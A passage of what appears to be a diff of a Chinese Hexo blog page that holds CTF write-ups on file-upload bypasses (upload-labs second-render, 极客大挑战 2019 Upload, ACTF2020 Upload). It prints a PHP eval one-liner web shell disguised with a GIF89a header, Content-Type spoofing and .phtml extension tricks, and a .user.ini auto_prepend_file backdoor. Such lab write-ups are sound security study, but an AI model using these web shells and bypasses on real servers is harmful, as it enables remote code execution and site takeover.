获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一关对上传图片进行了判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif&#x2F;jpg&#x2F;png图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接<br>补充知识：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二次渲染：后端重写文件内容</span><br><span class="line">imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br></pre></td></tr></table></figure>
+<p>ps:对于做文件上传之二次渲染建议用GIF图片，相对于简单一点<br>pass:上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片<br><img src="/./img/160.png"><br><img src="/./img/148.png"><br><img src="/./img/149.png"></p>
+<h2 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h2><h3 id="php标记"><a href="#php标记" class="headerlink" title="php标记"></a>php标记</h3><p>1、标准标记<br>标准标记以<?php开始，以?>结束<br>标准标记是PHP最常用的标记类型，具有更好的兼容性、可移植性、可复用性</p>
+<p>2、短标记<br>短标记以“<?”开始，以“?>”结束<br>短标记非常简单，但是使用短标记需要在配置文件php.ini中启用short_open_tag选项，短标记在许多环境的默认设置中是不支持的，因此PHP不推荐使用这种标记</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo “Hello,PHP”;  ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、ASP标记<br>ASP标记以“&lt;%”开始，以“%&gt;”结束</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% echo “Hello,PHP”;  %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4、SCRIPT标记<br>SCRIPT标记以“<code>&lt;script language=“php”&gt;</code>”开始，以“<code>&lt;/script&gt;</code>”结束</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=“php”&gt; echo “Hello,PHP”;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>SCRIPT标记类似于javascript语言标记，由于PHP一般不推荐使用该标记<br>在上述四种标记中，只有标准标记和SCRIPT标记能够保证对任何配置都有效</p>
+<h3 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h3><p>1、C++风格注释：以“&#x2F;&#x2F;”开始，到该行结束或PHP标记结束之前的内容都是注释，单行注释<br>2、C风格注释：C风格注释以“<code>/*</code>”开始，以“<code>*/</code>”结束<br>3、Shell风格注释:#输出一段话,单行注释</p>
+<p>#pass:<br><img src="/./img/147.png"><br>先上传一句话木马试试，这里格式直接不变，先上传看看<br><img src="/./img/150.png"><br>提示说不是图片，需要抓包改文件格式。将Content-Type里面的格式改为image&#x2F;jpeg<br>绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht<br><img src="/./img/151.png"><br>前几个php格式的一句话都被b了，比如php3<br><img src="/./img/152.png"><br>将文件格式改到phtml可以了，但带&lt;?的一句话都不行<br>换个一句话木马   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[1])&lt;/script&gt;</span><br><span class="line">//习惯在文件前加上GIF89a来绕过PHP getimagesize的检查</span><br></pre></td></tr></table></figure>
+<p>没加GIF89a如图<br><img src="/./img/153.png"><br>然后上传，抓包改文件格式为image&#x2F;jpeg<br>拿蚁剑连接,flag在根目录里面</p>
+<h3 id="文件头绕过getimagesize"><a href="#文件头绕过getimagesize" class="headerlink" title="文件头绕过getimagesize()"></a>文件头绕过getimagesize()</h3><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。<br><strong>GIF89a</strong><br>“GIF89a”经常作为“Graphics Interchange Format number 89A”的缩写来使用，中文表示：“图形交换格式编号89A”<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。</p>
+<ul>
+<li>绕过原理<br>绕过getimagesize()其实很简单，我们只需要在文件内容的起始位置加上一个GIF89a即可，这样我们的文件就会被认为是一个图片，php的getimagesize()函数也检测不出来我们构造的这个“虚假”的图片是无效的。</li>
+</ul>
+<h2 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h2><p>直接尝试上传1.php<br><img src="/./img/154.jpg"><br>是文件限制，打开源代码<br><img src="/./img/155.jpg"><br>return checkFile()删去，继续上传<br>如果是PHP文件，发现也是不能上传的，说明后端也有验证，直到phtml<br><img src="/./img/156.jpg"></p>
+<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>.user.ini文件形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件,前提是含有.user.ini的文件夹下需要有正常的php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>
+<p>图片+htaccess文件的上传不成功</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
